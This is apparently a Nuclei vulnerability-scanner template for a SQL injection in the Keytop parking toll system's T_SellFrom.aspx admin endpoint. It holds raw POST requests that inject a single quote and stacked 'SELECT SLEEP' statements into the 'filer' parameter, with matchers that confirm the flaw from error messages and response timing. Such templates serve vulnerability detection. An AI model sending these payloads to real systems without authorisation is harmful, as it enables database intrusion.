id: poc-yaml-keytop-toll-system-t-sellfrom-aspx-sqli
info:
  name: "科拓全智能停车收费系统 T_SellFrom.aspx SQL注入"
  author: ProjectDiscoveryAI
  severity: high
  tags: 科拓全智能停车收费系统

http:
  - raw:
      - |
        POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        start=0&limit=20&filer=1'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "SQL syntax"
          - "MySQL server"
        part: body

  - raw:
      - |
        POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        start=0&limit=20&filer=1;SELECT SLEEP(5)#
      - |
        POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        start=0&limit=20&filer=1;SELECT SLEEP(8)#
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success:true"
        part: body
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
